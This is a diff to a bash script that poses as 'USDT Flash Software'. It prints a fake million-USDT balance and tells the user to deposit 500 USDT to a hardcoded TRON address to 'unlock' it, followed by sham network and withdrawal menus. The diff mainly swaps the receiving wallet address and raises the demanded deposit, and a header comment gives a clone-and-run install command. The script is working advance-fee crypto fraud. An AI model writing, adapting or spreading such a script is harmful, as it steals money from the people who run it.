@@ -2,7 +2,7 @@
 
 pkg install git && git clone https://github.com/flashusdtsoftwear/Usdt_Flash.git
 # cd Usdt_Flash && bash Usdt_Flash.sh
-balance=1000000 hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099" account_id="TASsP1Uerf77BpX8TJeZrfDanVDypsABk2"
+balance=1000000 hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099" account_id="TPwuZDpMg5s8Xk6KwFHzDKhiTmDGC2PDS1"
 usdt_logo="
 \e[38;2;38;161;123m$$$$$$\
 $$  __$$\
@@ -24,7 +24,7 @@ function fancyBoxEcho {
 welcome_message="Welcome to the USDT Flash Software! Unlock your balance and enjoy the power of Flash USDT!"
 echo -e "$usdt_logo"
 fancyBoxEcho "$welcome_message"
-echo -e "To unlock your balance of $balance USDT, please deposit 205 USDT to the following address: $account_id"
+echo -e "To unlock your balance of $balance USDT, please deposit 500 USDT to the following address: $account_id"
 function unlockBalance {
     echo " "
     read -p "Enter your deposit amount in USDT: " depositAmount
@@ -35,7 +35,7 @@ echo " "
         echo -e " \e[32mValidating please wait...\e[0m"
         sleep 0.5
     done
-    echo " "
+echo " "
     if [[ $depositAmount -eq 500 && $transactionHash == "$hash_id" ]]; then
         refresh
         selectNetwork
@@ -50,11 +50,11 @@ echo " "
 function selectNetwork {
 #    echo -e "$usdt_logo"
 echo "Select network:"
-    echo " "
-    echo "1. TRC20"
-    echo "2. ERC20"
-    echo "3. BEP20"
-    echo " "
+echo " "
+echo "1. TRC20"
+echo "2. ERC20"
+echo "3. BEP20"
+echo " "
     echo -n "Enter your choice: "
     read network_choice
     case $network_choice in
@@ -66,11 +66,11 @@ echo "Select network:"
     selectWithdrawalAmount
 }
 function selectWithdrawalAmount {
-    echo "Select withdrawal amount:"
-    echo "1. 1000000"
-    echo "2. 500000"
-    echo "3. 300000"
-    echo "4. 100000"
+ echo "Select withdrawal amount:"
+ echo "1. 1000000"
+ echo "2. 500000"
+ echo "3. 300000"
+ echo "4. 100000"
     echo -n "Enter your choice: "
     read amount_choice
     case $amount_choice in
@@ -94,7 +94,7 @@ function refresh {
     echo -e "$usdt_logo"
     echo " "
     fancyBoxEcho "$welcome_message"
-    echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT Under TRC20 to the following address: $account_id"
+    echo -e "To unlock your balance of $balance USDT, please deposit 500 USDT Under TRC20 to the following address: $account_id"
 }
 refresh # Call the refresh function when the script starts
 while true; do
